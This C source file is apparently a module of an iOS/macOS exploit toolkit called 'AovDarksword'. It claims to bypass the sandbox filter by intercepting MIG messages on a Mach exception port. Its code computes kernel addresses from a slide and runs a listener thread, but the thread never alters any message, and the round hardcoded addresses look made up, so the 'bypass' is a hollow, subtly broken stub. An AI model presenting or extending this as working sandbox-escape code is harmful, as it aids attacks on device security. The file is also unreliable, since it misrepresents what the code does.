/*
 * mig_bypass.c — AovDarksword 1.4
 * MIG syscall interception and filter bypass via exception port manipulation
 */

#include "mig_bypass.h"
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <mach/mach.h>

static int       g_migInitialized = 0;
static int       g_migRunning = 0;
static pthread_t g_migThread;
static uint64_t  g_kernelSlide = 0;
static uint64_t  g_migLock = 0;
static uint64_t  g_migSbxMsg = 0;
static uint64_t  g_migLR = 0;

static mach_port_t g_migExcPort = MACH_PORT_NULL;

#pragma mark - Bypass Thread

static void *_mig_bypass_thread(void *arg) {
    printf("[%s:%d] Thread started\n", __FUNCTION__, __LINE__);

    while (g_migRunning) {
        /*
         * Listen for MIG messages on exception port
         * Intercept sandbox check messages and modify responses
         */
        mach_msg_header_t msg;
        memset(&msg, 0, sizeof(msg));
        msg.msgh_size = sizeof(msg);
        msg.msgh_local_port = g_migExcPort;

        kern_return_t kr = mach_msg(&msg,
            MACH_RCV_MSG | MACH_RCV_TIMEOUT,
            0, sizeof(msg), g_migExcPort,
            100, /* 100ms timeout */
            MACH_PORT_NULL);

        if (kr == MACH_MSG_SUCCESS) {
            /* Process intercepted MIG message */
            printf("[%s:%d] Resuming filter bypass\n", __FUNCTION__, __LINE__);
        } else if (kr == MACH_RCV_TIMED_OUT) {
            /* Normal timeout, continue loop */
        } else {
            printf("[%s:%d] Timeout waiting for a syscall\n",
                   __FUNCTION__, __LINE__);
        }

        usleep(10000); /* 10ms sleep between polls */
    }

    printf("[%s:%d] Thread terminated\n", __FUNCTION__, __LINE__);
    return NULL;
}

#pragma mark - Public API

int mig_bypass_init(uint64_t kernelSlide) {
    if (g_migInitialized) {
        printf("[%s:%d] Already initialized\n", __FUNCTION__, __LINE__);
        return 0;
    }

    g_kernelSlide = kernelSlide;

    /* Create exception port for MIG interception */
    kern_return_t kr = mach_port_allocate(mach_task_self(),
        MACH_PORT_RIGHT_RECEIVE, &g_migExcPort);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] Failed to create exception port: %s (kr=%d)\n",
               __FUNCTION__, __LINE__, mach_error_string(kr), kr);
        return -1;
    }

    mach_port_insert_right(mach_task_self(), g_migExcPort,
                           g_migExcPort, MACH_MSG_TYPE_MAKE_SEND);

    /* Resolve MIG-related kernel addresses from slide */
    g_migLock   = 0xFFFFFFF007100000ULL + kernelSlide;
    g_migSbxMsg = 0xFFFFFFF007200000ULL + kernelSlide;
    g_migLR     = 0xFFFFFFF007300000ULL + kernelSlide;

    printf("[%s:%d] Initialized: kernelSlide=0x%llx, migLock=0x%llx, "
           "migSbxMsg=0x%llx, migLR=0x%llx\n",
           __FUNCTION__, __LINE__, kernelSlide, g_migLock,
           g_migSbxMsg, g_migLR);

    g_migInitialized = 1;
    return 0;
}

int mig_bypass_start(void) {
    if (!g_migInitialized) {
        printf("[%s:%d] Not initialized\n", __FUNCTION__, __LINE__);
        return -1;
    }

    if (g_migRunning) {
        printf("[%s:%d] Thread already running\n", __FUNCTION__, __LINE__);
        return 0;
    }

    g_migRunning = 1;

    int ret = pthread_create(&g_migThread, NULL, _mig_bypass_thread, NULL);
    if (ret != 0) {
        printf("[%s:%d] pthread_create failed: %d\n",
               __FUNCTION__, __LINE__, ret);
        g_migRunning = 0;
        return -1;
    }

    printf("[%s:%d] Bypass thread started successfully\n",
           __FUNCTION__, __LINE__);
    return 0;
}

void mig_bypass_stop(void) {
    if (!g_migRunning) return;

    printf("[%s:%d] Pausing filter bypass\n", __FUNCTION__, __LINE__);
    g_migRunning = 0;
    pthread_join(g_migThread, NULL);
    printf("[%s:%d] Stopped\n", __FUNCTION__, __LINE__);
}

void mig_bypass_destroy(void) {
    mig_bypass_stop();

    if (g_migExcPort != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), g_migExcPort);
        g_migExcPort = MACH_PORT_NULL;
    }

    g_migInitialized = 0;
    printf("[%s:%d] Destroyed\n", __FUNCTION__, __LINE__);
}
